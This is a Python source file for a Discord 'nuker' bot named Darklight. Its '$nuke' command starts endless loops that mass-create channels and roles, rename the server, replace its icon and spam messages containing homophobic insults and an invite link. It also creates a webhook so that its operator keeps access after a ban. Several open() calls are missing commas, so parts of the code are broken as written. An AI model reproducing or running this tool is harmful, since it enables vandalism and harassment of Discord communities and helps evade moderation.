
#██████╗░░█████╗░██████╗░██╗░░██╗██╗░░░░░██╗░██████╗░██╗░░██╗████████╗
#██╔══██╗██╔══██╗██╔══██╗██║░██╔╝██║░░░░░██║██╔════╝░██║░░██║╚══██╔══╝
#██║░░██║███████║██████╔╝█████═╝░██║░░░░░██║██║░░██╗░███████║░░░██║░░░
#██║░░██║██╔══██║██╔══██╗██╔═██╗░██║░░░░░██║██║░░╚██╗██╔══██║░░░██║░░░
#██████╔╝██║░░██║██║░░██║██║░╚██╗███████╗██║╚██████╔╝██║░░██║░░░██║░░░
#╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░



import discord
from discord.ext import commands
import random
import asyncio
import os

intents = discord.Intents.all()
intents.typing = True
intents.presences = False
Client = commands.Bot(command_prefix='$', intents=intents)

Settings = {
    'Activity': 'Enter your custom activity here',
    'Token': 'Enter Token',
    'NewServerIcon': 'icon.jpeg',
    'DiscordInvite': None,
    'WebhookName': 'Balls'
}

if os.path.exists('Bin') and os.path.isdir('Bin'):
    if os.path.exists('Bin/Token.txt') and os.path.isfile('Bin/Token.txt'):
        with open('Bin/Token.txt', 'r') as file:
            Settings['Token'] = file.read()
    if os.path.exists('Bin/Activity.txt') and os.path.isfile('Bin/Activity.txt'):
        with open('Bin/Activity.txt' 'r') as file:
            Settings['Activity'] = file.read()
    if os.path.exists('Bin/WebhookName.txt') and os.path.isfile('Bin/WebhookName.txt'):
        with open('Bin/WebhookName.txt' 'r') as file:
            Settings['WebhookName'] = file.read()
    if os.path.exists('Bin/DiscordInvite.txt') and os.path.isfile('Bin/DiscordInvite.txt'):
        with open('Bin/DiscordInvite.txt' 'r') as file:
            Settings['DiscordInvite'] = file.read()


@Client.event
async def on_ready():
    await Client.change_presence(activity=discord.Game(name=Settings['Activity']))
    print(f'Launched as {Client.user.name}')


class Booter:
    async def Channels(ctx):
        while True:
            guild = ctx.guild
            Names = ['Dickless', 'Gingerbreadman']
            await guild.create_text_channel(random.choice(Names))

    async def Roles(ctx):
        while True:
            guild = ctx.guild
            await guild.create_role(name='Darklight on top')

    async def Name(ctx):
        while True:
            guild = ctx.guild
            await guild.edit(name='Darklight tech support')

    async def Icon(ctx):
        while True:
            guild = ctx.guild
            with open(Settings['NewServerIcon'], 'rb') as icon_file:
                await guild.edit(icon=icon_file.read())

    async def Messages(ctx):
        while True:
            if Settings['DiscordInvite'] != None:
                await ctx.send(f'Gay ass server instead join {Settings['DiscordInvite']}')
            else:
                await ctx.send(f'Gay ass server. \nhttps://tenor.com/view/elonmusk-gif-15812849364225011268')


@Client.command(name='nuke')
async def nuke(ctx):
    print('Darklight: Received nuke command')
    webhook = await ctx.channel.create_webhook(name=Settings['WebhookName'])
    url = webhook.url
    print(f"We've created a webhook incase the bot gets banned, here is the URL: \n{url}")
    asyncio.create_task(Booter.Channels(ctx))
    asyncio.create_task(Booter.Roles(ctx))
    asyncio.create_task(Booter.Name(ctx))
    asyncio.create_task(Booter.Icon(ctx))
    asyncio.create_task(Booter.Messages(ctx))


Client.run(Settings['Token'])
